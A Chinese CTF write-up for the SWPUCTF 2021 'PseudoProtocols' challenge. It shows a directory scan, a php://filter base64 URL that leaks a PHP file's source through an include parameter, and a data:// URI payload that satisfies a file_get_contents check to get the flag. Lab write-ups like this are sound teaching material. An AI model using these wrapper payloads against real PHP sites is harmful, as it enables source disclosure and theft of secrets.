# [SWPUCTF 2021 新生赛]PseudoProtocols wp

![](1.png)

题目提示伪协议。扫描发现确实有 hint.php。  
```
[09:54:27] Scanning:
[09:55:01] 200 -     0B - /flag.php
[09:55:04] 200 -     0B - /hint.php
[09:55:05] 302 -    48B - /index.php  ->  index.php?wllm=
[09:55:05] 302 -    48B - /index.php/login/  ->  index.php?wllm=
[09:55:22] 403 -   311B - /server-status
[09:55:22] 403 -   312B - /server-status/
```

而且链接发现可以传参给 wllm。  

试试用 `php://filter` 读 hint.php 看看:

```
http://node7.anna.nssctf.cn:22739/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php
```

出来一段 base64 值，解密出来是：
```
<?php
//go to /test2222222222222.php
?>
```

那就去看看 test2222222222222.php：  
php 源码被泄漏：
``` php
<?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
    echo "success\n";
    echo $flag;
}
?>
```

提示 GET 传参给变量 $a。后面判断有一个 `file_get_contents()` 函数。  

## file_get_contents()

``` php
file_get_contents(path,include_path,context,start,max_length);
```

file_get_contents() 把整个文件读入一个字符串中。

file_get_contents 可以读多种源，不只是本地文件。  
你可以利用其搭配伪协议传入文本。这恰好是本题需要的。   

``` php
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag')
```
该代码有两个参数，第二个参数是个 'r' 查阅文档发现该参数应该是一个布尔值用于是否在 include_path 中搜索文件。非零即为 true。   

要求其返回值为 "I want flag"。  

## data:// 直接嵌入数据
可以给 a 传入 `data://text/plain,` 比如:
```
data://text/plain,文本
```

这样就传入了字符串:`文本`，而题目需要的字符串包含空格，需要用 %20 来分割，亦或者可以先加密为 base64 再传入，使用：

```
data://text/plain;base64,SSB3YW50IGZsYWc=
```

传入的就是 `I want flag`  

在终端输入获得 base64 值：
``` bash
echo -n "I want flag" | base64
```
SSB3YW50IGZsYWc=  
传入即可。  
注意 echo 默认会带换行符，需要加 `-n` 参数。  
```
http://node7.anna.nssctf.cn:22739/test2222222222222.php/?a=data://text/plain;base64,SSB3YW50IGZsYWc=
```

这样传参后就拿到 flag 了。  

## 参考资料
1. [菜鸟教程 PHP file_get_contents() 函数](https://www.runoob.com/php/func-filesystem-file-get-contents.html)
2. [CSDN PHP伪协议详解](https://blog.csdn.net/cosmoslin/article/details/120695429)
